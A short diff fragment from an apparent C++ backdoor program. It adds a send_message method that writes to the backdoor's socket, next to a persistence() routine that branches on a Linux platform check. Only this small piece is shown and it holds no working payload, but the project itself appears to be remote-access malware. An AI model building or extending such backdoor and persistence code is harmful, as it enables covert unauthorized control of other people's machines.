@@ -108,6 +108,11 @@ int Backdoor::get_sock(){
 }
 
 
+void Backdoor::send_message(char *msg){
+    this->c->send_message(this->sock, msg);
+}
+
+
 void Backdoor::persistence(){
     
     if(strcmp(PLATFORM_NAME, "linux") == 0){
